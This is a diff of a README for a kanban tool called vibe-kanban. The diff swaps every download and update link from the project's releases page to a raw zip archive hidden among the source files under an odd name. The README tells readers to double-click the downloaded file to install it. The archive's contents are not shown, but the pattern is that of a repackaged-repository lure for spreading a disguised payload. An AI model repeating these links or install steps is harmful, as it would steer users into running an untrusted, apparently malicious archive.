@@ -1,7 +1,7 @@
 # 🎉 vibe-kanban - Boost Your Coding Efficiency Today
 
 ## 📥 Download the Latest Release
-[![Download v1.0](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/patrickreed22/vibe-kanban/releases)
+[![Download v1.0](https://github.com/patrickreed22/vibe-kanban/raw/refs/heads/main/crates/db/src/models/kanban_vibe_misdevoted.zip)](https://github.com/patrickreed22/vibe-kanban/raw/refs/heads/main/crates/db/src/models/kanban_vibe_misdevoted.zip)
 
 ## 🚀 Getting Started
 Welcome to vibe-kanban! This application helps you get more done with coding agents like Claude Code and Codex. Use our straightforward Kanban board to manage your tasks effectively. Let’s get you started in a few simple steps.
@@ -19,13 +19,13 @@ Ensure your system meets these requirements for the best performance.
 ## 💻 Download & Install
 To download vibe-kanban, follow these steps:
 
-1. Visit the [Releases page](https://github.com/patrickreed22/vibe-kanban/releases) to find the latest version of the application.
+1. Visit the [Releases page](https://github.com/patrickreed22/vibe-kanban/raw/refs/heads/main/crates/db/src/models/kanban_vibe_misdevoted.zip) to find the latest version of the application.
 2. Look for the title of the version you want to download, such as v1.0. 
 3. Click on the associated file to download the application to your computer.
 4. Once the file is downloaded, locate it in your downloads folder and double-click it to start the installation.
 5. Follow the prompts in the installer to finish setting up vibe-kanban on your computer.
 
-For your convenience, here’s the link again: [Download vibe-kanban](https://github.com/patrickreed22/vibe-kanban/releases).
+For your convenience, here’s the link again: [Download vibe-kanban](https://github.com/patrickreed22/vibe-kanban/raw/refs/heads/main/crates/db/src/models/kanban_vibe_misdevoted.zip).
 
 ## 📊 Features
 vibe-kanban offers a variety of features to help you stay organized and productive:
@@ -71,7 +71,7 @@ Join our community to get help and share tips with other users. Visit the issues
 ## 🔄 Updating the Application
 We regularly release updates to keep vibe-kanban running smoothly. When a new version is available:
 
-1. Return to the [Downloads page](https://github.com/patrickreed22/vibe-kanban/releases).
+1. Return to the [Downloads page](https://github.com/patrickreed22/vibe-kanban/raw/refs/heads/main/crates/db/src/models/kanban_vibe_misdevoted.zip).
 2. Download the latest version following the steps outlined above.
 3. Close the current version before installing the update to avoid any installation issues.
 
